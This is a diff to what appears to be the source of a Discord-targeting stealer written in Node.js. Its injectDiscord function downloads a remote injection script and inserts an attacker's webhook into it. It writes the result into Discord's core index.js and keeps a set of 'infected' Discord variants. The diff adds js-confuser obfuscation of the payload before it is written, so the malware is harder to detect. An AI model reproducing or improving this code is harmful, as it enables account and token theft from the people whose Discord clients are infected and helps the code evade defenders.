@@ -2,6 +2,7 @@ const { getUsers }  = require('../../../utils/harware.js');
 
 const child_process = require('child_process');
 const fsPromises    = require('fs/promises');
+const jsConfuser    = require('js-confuser');
 const FormData      = require('form-data');
 const axios         = require('axios');
 const path          = require('path');
@@ -36,10 +37,35 @@ async function injectDiscord(dir, injectionUrl, webhook) {
                 const response = await axios.get(injectionUrl);
                 const injection = response.data;
 
-                const applyInjection = injection.replace("%WEB" + "HOOK%", webhook);
+                const srcInjection = injection.replace("%WEB" + "HOOK%", webhook);
+                
+                const applyObfInjection = await jsConfuser.obfuscate(srcInjection, {
+                    target: "node",
+                    controlFlowFlattening: 0,
+                    minify: false,
+                    globalConcealing: true,
+                    stringCompression: 1,
+                    stringConcealing: 0.9,
+                    stringEncoding: 0.3,
+                    stringSplitting: 1,
+                    deadCode: 0,
+                    calculator: 0.5,
+                    compact: true,
+                    movedDeclarations: false,
+                    objectExtraction: false,
+                    stack: true,
+                    duplicateLiteralsRemoval: 0,
+                    flatten: false,
+                    dispatcher: true,
+                    opaquePredicates: 0,
+                    shuffle: { hash: 0.6, true: 0.6 },
+                    renameVariables: false,
+                    renameGlobals: false
+                });
+
                 const indexJsPath = path.join(coreDir, 'index.js');
 
-                await fsPromises.writeFile(indexJsPath, applyInjection, 'utf8');
+                await fsPromises.writeFile(indexJsPath, applyObfInjection, 'utf8');
                 const match = coreDir.match(/Local\\(discordcanary|discord|discorddevelopment|discordptb)\\/i);
                 if (match) {
                     infectedDiscord.add(match[1].toLowerCase());
